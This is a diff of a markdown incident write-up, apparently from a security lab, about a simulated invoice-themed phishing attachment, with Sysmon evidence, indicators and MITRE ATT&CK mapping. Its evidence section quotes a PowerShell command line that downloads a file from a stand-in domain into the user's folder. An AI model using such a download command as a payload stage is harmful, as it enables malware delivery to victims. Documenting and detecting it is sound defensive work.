@@ -1,32 +1,44 @@
-# Lab 2: Phishing Email 
+## Lab 2: Phishing Email 
 
-## Scenario
+### Scenario
 A user in the accounts department received an email with an
 attachment titled "Invoice.html". The email stated a payment was overdue
 and instructed the user to open the attachment to review invoice details. 
-Upon opening the attachment, suspicious activity was observed on the
-endpoint.
+The phishing email contained an HTML attachment named "invoice.html". When the user opened the attachment, embedded script triggered the
+execution of PowerShell which downloaded additional content from an
+external domain.
 
-## Incident Timeline
+### Incident Timeline
 1. User received a phishing email with an invoice-themed attachment, common technique in phishing campaigns
 2. User opened the attachment
 3. A PowerShell process was executed
 4. PowerShell initiated outbound HTTPS communication
 5. A file named `invoice.html` was written to the user's Documents directory
 
-### Screenshot - powershell execution
+### Flow Diagram
+Phishing Email
+      ↓
+User Opens Attachment
+      ↓
+PowerShell Execution
+      ↓
+Outbound Network Connection
+      ↓
+File Download (invoice.html)
+
+#### Screenshot - powershell execution
 ![powershell-execution](./screenshots/01_phishing-execution.png)
 
-### Screenshot - invoice.html written to directory
+#### Screenshot - invoice.html written to directory
 ![phishing_execution](./screenshots/02_phishing_invoice.jpg)
 
-## Detection 
+### Detection 
 - PowerShell was used instead of a browser to retrieve external content
 - The file was written to a user accessible directory
 - Outbound network traffic originated from a scripting engine
 
 ## Evidence
-## Event ID 1 — Process Creation
+### Event ID 1 — Process Creation
 Image: C:\\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
 CommandLine: powershell.exe -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://example.com', '$env:USERPROFILE\Documents\Phishing_Test\invoice.html')"
 User: DESKTOP-NJTJAHZ\windows11
@@ -35,7 +47,7 @@ User: DESKTOP-NJTJAHZ\windows11
 ![sysmon_event1](./screenshots/03_sysmon_event1_process_creation.png)
 
 
-## Event ID 3 — Network Connection
+### Event ID 3 — Network Connection
 Image: C:\\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
 DestinationHostname: example.com
 DestinationPort: 80
@@ -47,6 +59,11 @@ Protocol: HTTP
 ## Event ID 11 — File Creation
 Image: C:\\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
 TargetFilename:C:\\Users\windows11\Appdata\Local\Temp\__PSScriptPolicyTest_rc5tv5x1.dxt.ps1
+
+#### Indicators of Compromise
+Domain: example.com
+Process: powershell.exe
+File Name: invoice.html
 
 ## MITRE ATT&CK Analysis
 ### T1566 – Phishing (Initial Access)
